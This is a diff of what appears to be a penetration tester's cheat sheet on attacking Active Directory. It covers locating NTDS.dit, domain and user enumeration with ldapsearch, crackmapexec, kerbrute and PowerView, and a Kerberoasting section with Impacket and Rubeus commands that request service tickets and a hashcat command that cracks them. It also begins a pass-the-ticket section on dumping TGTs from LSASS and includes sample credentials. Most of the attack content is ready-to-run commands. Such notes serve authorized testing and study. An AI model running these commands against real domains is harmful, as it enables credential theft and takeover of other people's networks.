@@ -7,15 +7,18 @@
 * Domain Controller (DC) is a Windows Server containing Active Directory Domain Services (AD DS)
 * AD DS data store: **NTDS.dit** - a database that contains all of the information of an Active Directory domain controller as well as password hashes for domain users.
 * **NTDS.dit** is stored by default in %SystemRoot%\NTDS  
-```
+
+```powershell
 # Or find ntds.dit using Powershell
 Get-ChildItem -Path c:\ -Include ntds.dit -Recurse
 ```
-* DC handles authentication and authorization services 
+
+* DC handles authentication and authorization services
 * DC replicate updates from other domain controllers in the forest
 * DC Allows admin access to manage domain resources
 
 ### Forest
+
 * Forest: collection of one or more trees
 * Tree: collection of several domains with hierarchical order
 * Organizational Units (OUs): Containers for groups, computers, users, printers and other OUs
@@ -40,9 +43,31 @@ Users are core of AD and DC's task is to manage access of those users to service
 * Security Groups: permissions users and services. Some groups have rights to change DACLs.
 * Distribution Groups: email distribution lists. As an attacker these groups are less beneficial to us but can still be beneficial in enumeration
 
+### Time Sync
+
+* to be able to use Kerberos Authentication it is necessary to sync clock with AD domain controller
+
+```bash
+
+sudo apt-get install ntp
+
+vi /etc/ntp.conf
+
+server 0.dc01.corp.local
+
+
+/etc/init.d/ntpd restart
+
+# or
+
+/usr/sbin/ntpdate pool.ntp.org
+
+
+```
+
 ## Active Directory Enumeration
 
-#### net.exe
+### net.exe
 
 'net.exe' system utility is widely available and can be used once foothold on windows host within domain is obtained.
 
@@ -61,7 +86,7 @@ For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-serv
 * **Using nltest**: `nltest /dclist:domain.local`
 
 
-#### powershell methods
+### powershell methods
 
 * execute commands stand alone or make a script
 
@@ -107,7 +132,7 @@ $sales.properties.member
 ```
 
 
-#### AD DNS
+## AD DNS
 
 ```bash
 
@@ -121,18 +146,18 @@ nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='domain.com'"
 
 ```
 
-#### Domain Hosts Discovery
+### Domain Hosts Discovery
 
 * NetBios scan: `nbtscan 192.168.100.0/24`
 * LDAP query of domain base (credentials required): `ldapsearch -H ldap://dc.ip -x -LLL -W -D "anakin@contoso.local" -b "dc=contoso,dc=local" "(objectclass=computer)" "DNSHostName" "OperatingSystem" `
 * NTLM info scirpt: `ntlm-info smb 192.168.100.0/24`
 * Scan also for ports: 135(RPC) and 139(NetBIOS serssion service)
 
-#### Users discovery
+### Users discovery
 
 `ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"`
 
-#### Domain dump with ldap
+### Domain dump with ldap
 
 ```
  ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
@@ -153,19 +178,19 @@ ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.su
 * targetedKerberoast: https://github.com/ShutdownRepo/targetedKerberoast
 
 
-#### Crackmapexec
+### Crackmapexec
 
 find machines in range where current user is admin
 
 `cme smb 192.168.239.0/24 -u pete -p "Nexus123\!" --continue-on-success`
 
-#### Kerbrute
+### Kerbrute
 
 find users of domain via TGT requests
 
 `./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.10.43.76  userlist.txt`
 
-#### PowerView
+### PowerView
 
 Reference: https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
 
@@ -479,39 +504,35 @@ PSexec can also be yused from windows client
 
 ### Kerberoasting
 
-* If local access is give then use Rubeus: 
-
-Check first: `Rubeus.exe kerberoast /stats`
-Roast: `Rubeus.exe kerberoast`
-
-
 * Look for kerberoastable accounts:
 
 `ldapsearch -H ldap://10.11.1.xxx -x -LLL -W -b "dc=xxx,dc=com" "(&(samAccountType=805306368)(servicePrincipalName=*))"`
 
 if credentials available then login using parameters
-`ldapsearch -H ldap://10.11.1.xxx -D 'Domain.com/User' -w 'PAsswrord'` 
- 
-* get TGSs for cracking 
+`ldapsearch -H ldap://10.11.1.xxx -D 'Domain.com/User' -w 'PAsswrord'`
 
+or use rubeus `Rubeus.exe kerberoast /stats`
+
+* Perform roasting
+
+```bash
+
+impacket-GetUserSPNs -request -dc-ip 192.168.xx.xx corp.com/user101
+
+#OR locally with  Rubeus
+
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap
+
+# selective for a specific SPN using ticket
+
+Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> /nowrap
 ```
-GetUserSPNs.py xxx.com/xxx:xxx -outputfile hashes.kroast -dc-ip 10.11.1.xxx
-
-OR Rubeus
-
-.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-
-
-Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]
-
-```
-
 
 * And finally, crack the hash
-`hashcat -a 0 -m 13100 --force SPN.hash /wordlists/rockyou.txt`
+
+`sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
 
 ### Pass the Ticket
-
 
 * dump TGT from LSASS
 * use TGT toact as domain admin by injecting it into current login sessions ID
